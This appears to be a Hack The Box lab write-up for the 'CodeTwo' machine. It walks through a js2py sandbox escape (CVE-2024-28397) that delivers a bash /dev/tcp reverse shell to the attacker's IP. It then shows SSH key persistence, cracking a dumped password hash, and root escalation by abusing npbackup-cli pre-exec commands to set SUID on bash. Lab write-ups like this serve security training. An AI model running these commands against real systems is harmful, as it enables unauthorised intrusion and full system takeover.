---
title: "HTB Lab: CodeTwo"
date: 2025-08-22 10:00:00 +0000
image:
  path: preview.png
layout: post
media_subpath: /assets/posts/2025-08-22-htb-codetwo
categories: [Linux, HTB-Easy]
tags: [HTB, HTB_Easy, js2py, CVE-2024-28397, Sandbox-Escape, SQLite, Credential-Cracking, npbackup, Sudo-Misconfiguration, Reverse-Shell, Linux]
description: "CodeTwo is a easy difficulty Linux machine on HTB that demonstrates the risks of insecure dependencies and misconfigured backup tools. By exploiting a vulnerable js2py sandbox (CVE-2024-28397), attackers can gain RCE through the web dashboard. From there, weakly hashed SQLite credentials enable lateral movement into the Marco account. Finally, abuse of npbackup-cli with sudo privileges allows escalation to root. This machine teaches players about dependency exploits, credential cracking, and privilege escalation through misconfigured backup utilities."
---

# Hack The Box — CodeTwo Writeup

## Discovery Scan

Initial enumeration with **nmap** revealed two open ports: SSH and an HTTP service hosted with Gunicorn.

| Port     | State | Service | Version                              |
| -------- | ----- | ------- | ------------------------------------ |
| 22/tcp   | open  | ssh     | OpenSSH 8.2p1 Ubuntu 4ubuntu0.13     |
| 8000/tcp | open  | http    | Gunicorn 20.0.4 (Welcome to CodeTwo) |

```bash
nmap -sC -sV -vv 10.10.11.82 -oA CodeTwo
```

---

## Port 8000 — CodeTwo Web Application

Browsing to `http://10.10.11.82:8000/` presented the **CodeTwo** landing page:

![](Pasted%20image%2020250820203612.png)

The site advertised itself as open-source and offered downloadable source files, which revealed:

```
├── app.py
├── instance
│   └── users.db
├── requirements.txt
├── static
│   ├── css/styles.css
│   └── js/script.js
└── templates
    ├── base.html
    ├── dashboard.html
    ├── index.html
    ├── login.html
    ├── register.html
    └── reviews.html
```

### Dependency Review

The `requirements.txt` contained:

```python
flask==3.0.3
flask-sqlalchemy==3.1.1
js2py==0.74
```

The vulnerable library **js2py (v0.74)** was confirmed to be affected by **[CVE-2024-28397](https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape)**, a sandbox escape leading to arbitrary Python execution.

---

## Exploitation — Remote Code Execution

Using a modified [PoC](https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape/blob/main/poc.py) payload, a reverse shell was injected via the dashboard code execution panel:

```javascript
let cmd = "bash -c 'exec bash -i &>/dev/tcp/10.10.14.12/1234 <&1'"
// [Remaining PoC code unchanged...]
```

Listener setup:

```bash
nc -lnvp 1234
```

Execution resulted in a callback as the `app` user:

```bash
app@codetwo:~/app$
```

![](Pasted%20image%2020250820210004.png)

---

## Persistence — SSH Access

SSH keys were added for stable access:

```bash
mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo "ssh-ed25519 AAAAC3..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

Now direct login was possible:

```bash
ssh app@10.10.11.82
```

---

## App User → Marco

Dumping the SQLite `users.db` in the `instance` folder revealed credentials:

```sql
1|marco|649c9d65a206a75f5abe509fe128bce5
2|app|a97588c0e2fa3a024876339e27aeb42e
```

Marco’s hash cracked with Hashcat:

```
649c9d65a206a75f5abe509fe128bce5:sweetangelbabylove
```

Valid credentials:

| User  | Password           |
| ----- | ------------------ |
| marco | sweetangelbabylove |

SSH as Marco granted access to the user flag.

---

## Marco → Root

Marco had access to `npbackup-cli` as root (NOPASSWD):

```bash
sudo -l
(ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

The configuration file supported **pre\_exec\_commands** and **post\_exec\_commands**.
By modifying `npbackup.conf` to include:

```yaml
pre_exec_commands: ["chmod u+s /bin/bash"]
post_exec_commands: ["chmod u+s /bin/bash"]
```

Execution escalated privileges:

```bash
sudo /usr/local/bin/npbackup-cli -c npbackup_attack.conf -b
/bin/bash -p
```

Root shell obtained.

---

## Attack Path Summary

| Stage                | Technique              | Language / Vector                                               | Outcome                        |
| -------------------- | ---------------------- | --------------------------------------------------------------- | ------------------------------ |
| Initial Foothold     | **Web Exploit**        | `js2py` sandbox escape (**CVE-2024-28397**)                     | Remote Code Execution as `app` |
| Persistence          | **SSH Key Injection**  | Authorized keys manipulation                                    | Stable shell as `app`          |
| Lateral Movement     | **Credential Dumping** | SQLite DB → Weak hash → Cracked with Hashcat                    | SSH access as `marco`          |
| Privilege Escalation | **Misconfigured Sudo** | `npbackup-cli` with root privileges → abuse `pre_exec_commands` | Root shell                     |
